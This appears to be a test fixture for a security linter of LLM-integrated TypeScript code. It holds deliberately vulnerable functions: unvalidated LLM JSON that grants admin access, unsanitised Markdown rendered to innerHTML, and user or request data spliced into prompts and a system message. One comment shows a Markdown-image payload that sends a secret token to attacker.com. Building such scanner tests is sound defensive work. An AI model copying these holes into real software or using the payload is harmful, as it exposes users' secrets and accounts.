import * as marked from 'marked';

// ---------------------------------------------------------------------------
// OUT-001: JSON.parse of LLM output without schema validation
// ---------------------------------------------------------------------------
async function processLLMResponse(completion: { content: string }) {
  const data = JSON.parse(completion.content); // OUT-001: no schema validation
  if (data.isAdmin) {
    grantAccess(data.userId);
  }
}

// Safe counterpart (would NOT be flagged):
// import { z } from 'zod';
// const UserSchema = z.object({ isAdmin: z.boolean(), userId: z.string() });
// const data = JSON.parse(completion.content);
// const validated = UserSchema.parse(data);

// ---------------------------------------------------------------------------
// OUT-002: LLM output rendered via Markdown without DOMPurify
// ---------------------------------------------------------------------------
function renderAssistantMessage(response: { text: string }) {
  const htmlContent = marked.parse(response.text); // OUT-002: no DOMPurify
  document.getElementById('output')!.innerHTML = htmlContent;
}

// Attacker-injected Markdown that would trigger this:
// ![x](https://attacker.com/exfil?data=SECRET_TOKEN)

// ---------------------------------------------------------------------------
// INJ-007: User input wrapped in code-fence delimiters without sanitising backticks
// ---------------------------------------------------------------------------
function buildTranslationPrompt(userText: string) {
  return `Translate the following text:\n\`\`\`${userText}\`\`\``; // INJ-007
}

// Safe counterpart:
// const safeText = userText.replace(/`/g, "'");
// return `Translate:\n\`\`\`${safeText}\`\`\``;

// ---------------------------------------------------------------------------
// INJ-008: HTTP request data interpolated into role: "system" template
// ---------------------------------------------------------------------------
function buildSystemMessage(req: { body: { persona: string } }) {
  const messages = [
    { role: 'system', content: `You are a helpful assistant. Persona: ${req.body.persona}` }, // INJ-008
    { role: 'user', content: 'Hello' },
  ];
  return messages;
}

// Keep linter happy
declare function grantAccess(userId: string): void;
export { processLLMResponse, renderAssistantMessage, buildTranslationPrompt, buildSystemMessage };
